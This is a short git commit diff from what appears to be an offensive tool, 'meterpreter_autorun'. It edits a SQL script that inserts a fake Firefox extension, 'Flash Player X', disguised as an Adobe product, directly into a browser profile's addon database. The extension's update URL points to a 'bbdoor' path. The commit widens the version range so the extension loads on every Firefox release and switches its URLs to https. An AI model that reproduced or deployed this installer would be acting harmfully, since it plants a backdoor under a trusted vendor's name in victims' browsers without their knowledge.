e9f2a9e8f4077bec6e24077e9b56faa4efd12701
Zoltan Balazs <zoltan1.balazs@gmail.com>
2013-01-25 20:15:14 +0100

    meterpreter installer bugfix

--- meterpreter_autorun/firefox/sqlite.sql
+++ meterpreter_autorun/firefox/sqlite.sql
@@ -1,9 +1,9 @@
-INSERT INTO "addon" VALUES ("83","flashX@adobe.com","DkV9eJGzwyD3","app-profile","0.8","extension",null,"http://127.0.0.1/bbdoor/update.rdf",null,null,null,null,"chrome://flashx/skin/icon-flash.png",null,"92","0","1","0","0","0","CHANGE_TO_FIREFOX_PROFILE_DIRECTORY\extensions\flashX@adobe.com.xpi","1333009124289","1333009124289","1","0","0","36221","file:///C:/flashX@adobe.com.xpi",null,"0","0","0","0");
+INSERT INTO "addon" VALUES ("83","flashX@adobe.com","DkV9eJGzwyD3","app-profile","0.8","extension",null,"https://127.0.0.1/bbdoor/update.rdf",null,null,null,null,"chrome://flashx/skin/icon-flash.png",null,"92","0","1","0","0","0","CHANGE_TO_FIREFOX_PROFILE_DIRECTORY\extensions\flashX@adobe.com.xpi","1333009124289","1333009124289","1","0","0","36221","file:///C:/flashX@adobe.com.xpi",null,"0","0","0","0");
 
-INSERT INTO "locale" VALUES ("92","Flash Player X","Flash Player X with advanced security and sandboxing/","Z","http://127.0.0.1/bbdoor");
+INSERT INTO "locale" VALUES ("92","Flash Player X","Flash Player X with advanced security and sandboxing/","Z","https://127.0.0.1/bbdoor");
 
-INSERT INTO "targetApplication" VALUES ("83","{ec8030f7-c20a-464f-9b0e-13a3a9e97384}","3.*","15.*");
-INSERT INTO "targetApplication" VALUES ("83","{a23983c0-fd0e-11dc-95ff-0800200c9a66}","3.*","15.*");
+INSERT INTO "targetApplication" VALUES ("83","{ec8030f7-c20a-464f-9b0e-13a3a9e97384}","3.*","*");
+INSERT INTO "targetApplication" VALUES ("83","{a23983c0-fd0e-11dc-95ff-0800200c9a66}","3.*","*");
 
 .quit	
 
